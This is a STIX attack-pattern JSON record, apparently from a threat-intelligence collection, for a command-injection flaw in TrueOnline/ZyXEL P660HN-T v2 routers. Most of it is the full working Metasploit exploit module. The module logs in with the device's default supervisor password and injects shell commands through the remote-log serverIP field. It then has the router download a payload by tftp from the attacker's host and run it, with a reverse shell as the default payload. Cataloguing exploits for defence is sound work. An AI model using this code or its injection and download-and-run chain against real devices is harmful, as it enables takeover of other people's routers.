{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8412559f-5d46-4c21-b15e-eb923db796f7",
    "created": "2024-08-14T17:01:16.842855Z",
    "modified": "2024-08-14T17:01:16.84286Z",
    "name": "TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection",
    "description": " TrueOnline is a major ISP in Thailand, and it distributes a customized version of the ZyXEL P660HN-T v2 router. This customized version has an authenticated command injection vulnerability in the remote log forwarding page. This can be exploited using the \"supervisor\" account that comes with a default password on the device. This module was tested in an emulated environment, as the author doesn't have access to the Thai router any more. Any feedback should be sent directly to the module's author, as well as to the Metasploit project. Note that the inline payloads work best. There are Turkish and other language strings in the firmware, so it is likely that this firmware is not only distributed in Thailand. Other P660HN-T v2 in other countries might be vulnerable too. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trueonline_p660hn_v2_rce.rb",
            "external_id": "trueonline_p660hn_v2_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18370"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18371"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Jan/40"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/2910"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection',\n      'Description'    => %q{\n        TrueOnline is a major ISP in Thailand, and it distributes a customized version of\n        the ZyXEL P660HN-T v2 router. This customized version has an authenticated command injection\n        vulnerability in the remote log forwarding page. This can be exploited using the \"supervisor\"\n        account that comes with a default password on the device.\n        This module was tested in an emulated environment, as the author doesn't have access to the\n        Thai router any more. Any feedback should be sent directly to the module's author, as well as\n        to the Metasploit project. Note that the inline payloads work best.\n        There are Turkish and other language strings in the firmware, so it is likely that this\n        firmware is not only distributed in Thailand. Other P660HN-T v2 in other countries might be\n        vulnerable too.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'References'     =>\n        [\n          ['CVE', '2017-18370'],\n          ['CVE', '2017-18371'],\n          ['URL', 'https://seclists.org/fulldisclosure/2017/Jan/40'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/2910']\n        ],\n      'Targets'        =>\n        [\n          [ 'P660HN-T v2', {}],\n        ],\n      'Privileged'     => true,\n      'Arch'           => ARCH_MIPSBE,\n      'DefaultOptions' => { 'PAYLOAD' => 'linux/mipsbe/shell_reverse_tcp' },\n      'DisclosureDate'  => '2016-12-26',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [true, 'Username for the web interface (using default credentials)', 'supervisor']),\n        OptString.new('PASSWORD', [true, 'Password for the web interface (using default credentials)', 'zyad1234']),\n        OptAddressLocal.new('LHOST', [ true, 'The listen IP address from where the victim downloads the MIPS payload' ]),\n        OptInt.new('DELAY', [true, \"How long to wait for the device to download the payload\", 30]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi!({\n      'uri'     => '/js/Multi_Language.js',\n      'method'  => 'GET'\n    })\n    if res && res.body =~ /P-660HN-T1A_IPv6/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def send_cmd(cmd)\n     res = send_request_cgi({\n        'uri'     => '/cgi-bin/pages/maintenance/logSetting/logSet.asp',\n        'method'  => 'POST',\n        'cookie'  => \"SESSIONID=#{@cookie}\",\n        'vars_post' => {\n          'logSetting_H' => '1',\n          'active'       => '1',\n          'logMode'      => 'LocalAndRemote',\n          'serverPort'   => rand_text_numeric(3),\n          # we have a short space for the payload - only 28 chars!\n          'serverIP'     => \"1.1.1.1`#{cmd}`&#\",\n        }\n      })\n\n    if res && res.code == 200\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def exploit\n    # first we authenticate\n    @cookie = rand_text_alpha_lower(7)\n\n    res = send_request_cgi({\n      'uri'     => '/cgi-bin/index.asp',\n      'query'   =>  Rex::Text.encode_base64(\"#{datastore['USERNAME']}:#{datastore['PASSWORD']}\"),\n      'method'  => 'POST',\n      'cookie'  => \"SESSIONID=#{@cookie}\",\n      'vars_post' => {\n        'Loginuser' => 'supervisor',\n        'Prestige_Login' => 'Login'\n      }\n    })\n\n    if res && res.code == 200\n      print_good(\"#{peer} - Successfully authenticated to the web interface.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to authenticate to the web interface.\")\n    end\n\n    #this filename is used to store the payload on the device -> the fewer chars the better!\n    filename = rand_text_alpha_lower(5)\n\n    # while echo'ing the payload, we can only send 10 chars at a time (see advisory for details)\n    exec_file = '/tmp/' + rand_text_alpha_lower(1)\n    script_file = %{#!/bin/sh\ncd /tmp;tftp -g -r #{filename} #{datastore['LHOST']};chmod +x /tmp/#{filename};sleep 5;/tmp/#{filename} &}\n\n    counter = 10\n    res = send_cmd(\"echo -n \\\"#{script_file[0..counter]}\\\">#{exec_file}\")\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Failed to inject payload.\")\n    end\n\n    while counter+1 < script_file.length\n      if (counter + 10) > script_file.length\n        ending = script_file.length - 1\n      else\n        ending = counter + 10\n      end\n\n      print_good(\"#{peer} - Successfully injected part of the payload, waiting 5 seconds before proceeding.\")\n      sleep 5\n\n      send_cmd(\"echo -n \\\"#{script_file[counter+1..ending]}\\\">>#{exec_file}\")\n      if not res\n        fail_with(Failure::Unknown, \"#{peer} - Failed to inject payload.\")\n      end\n\n      counter += (ending - counter)\n    end\n\n    print_good(\"#{peer} - Injection finished!\")\n    @pl = generate_payload_exe\n\n    #\n    # start our server\n    #\n    print_status(\"#{peer} - Starting up our TFTP service\")\n    @tftp = Rex::Proto::TFTP::Server.new\n    @tftp.register_file(filename,@pl,true)\n    @tftp.start\n\n    #\n    # download payload\n    #\n    print_status(\"#{peer} - Asking the device to download and execute the payload\")\n\n    # these two commands have to be 15 chars or less!\n    send_cmd(\"chmod +x #{exec_file}\")\n    send_cmd(\"#{exec_file} &\")\n\n    # wait for payload download\n    wait_linux_payload\n    @tftp.stop\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n    register_file_for_cleanup(\"#{exec_file}\")\n    sleep 10\n    handler\n  end\n\n  def wait_linux_payload\n    print_status(\"#{peer} - Waiting for the victim to request the ELF payload...\")\n    waited = 0\n    while (not @tftp.files.length == 0)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['DELAY'])\n        @tftp.stop\n        fail_with(Failure::Unknown, \"#{peer} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n    print_good(\"#{peer} - Payload was downloaded, wait for shell!\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}